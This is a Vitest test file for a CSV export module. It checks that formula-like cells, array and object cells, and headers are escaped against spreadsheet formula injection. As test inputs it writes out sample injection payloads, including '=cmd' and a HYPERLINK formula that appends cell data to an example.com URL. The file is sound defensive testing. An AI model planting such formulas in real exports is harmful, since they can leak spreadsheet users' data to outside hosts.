import { describe, expect, it, vi } from 'vitest';

import saveAsCsv, { toCsv } from './csv';
import { saveFile } from './saveFile';

vi.mock('./saveFile', () => ({ saveFile: vi.fn() }));

const lines = (fields: string[], row: unknown[]) =>
  toCsv({ fields, data: [row] }).split('\r\n');

describe('toCsv', () => {
  it.each([
    ['=1+1', `"'=1+1"`],
    ['+A1', `"'+A1"`],
    ['-1+1', `"'-1+1"`],
    ['@SUM(A1)', `"'@SUM(A1)"`],
    ['\t=1', `"'\t=1"`],
    ['\r=1', `"'\r=1"`],
    [
      '=HYPERLINK("https://example.com?"&A1)',
      `"'=HYPERLINK(""https://example.com?""&A1)"`,
    ],
  ])('escapes the formula-like cell %j', (cell, expected) => {
    expect(lines(['name'], [cell])[1]).toBe(expected);
  });

  it.each(['-12.5', '+3', 'Alice', 'a=b', ''])(
    'writes %j unchanged',
    (cell) => {
      expect(lines(['name'], [cell])[1]).toBe(cell);
    },
  );

  it('does not prefix a signed number that needs quoting', () => {
    expect(lines(['amount'], ['-1,234.50'])[1]).toBe('"-1,234.50"');
  });

  it('leaves numbers alone', () => {
    expect(lines(['n'], [-5])[1]).toBe('-5');
  });

  it('escapes a formula at the start of an array cell', () => {
    expect(lines(['affiliations'], [['=HYPERLINK("x")', 'b']])[1]).toBe(
      `"'=HYPERLINK(""x""), b"`,
    );
  });

  it('escapes an object cell whose string form is a formula', () => {
    const cell = { toString: () => '=1+1' };
    expect(lines(['name'], [cell])[1]).toBe(`"'=1+1"`);
  });

  it('escapes non-string values in rows given as objects', () => {
    expect(toCsv([{ name: ['=1+1'] }])).toBe(`name\r\n"'=1+1"`);
  });

  it('writes an array of plain values joined, and a date as before', () => {
    const date = new Date('2026-01-02T03:04:05Z');
    expect(lines(['a', 'b'], [['x', 'y'], date])[1]).toBe(
      `"x, y",2026-01-02T03:04:05.000Z`,
    );
  });

  it('escapes formula-like headers', () => {
    expect(lines(['=cmd', 'name'], ['a', 'b'])[0]).toBe(`"'=cmd",name`);
  });
});

describe('saveAsCsv', () => {
  it('saves escaped CSV under the table name', async () => {
    saveAsCsv('projects', { fields: ['name'], data: [['=1+1']] });

    expect(saveFile).toHaveBeenCalledOnce();
    const [blob, name] = vi.mocked(saveFile).mock.calls[0];
    expect(name).toBe('projects.csv');
    expect(await (blob as Blob).text()).toBe(`name\r\n"'=1+1"`);
  });
});
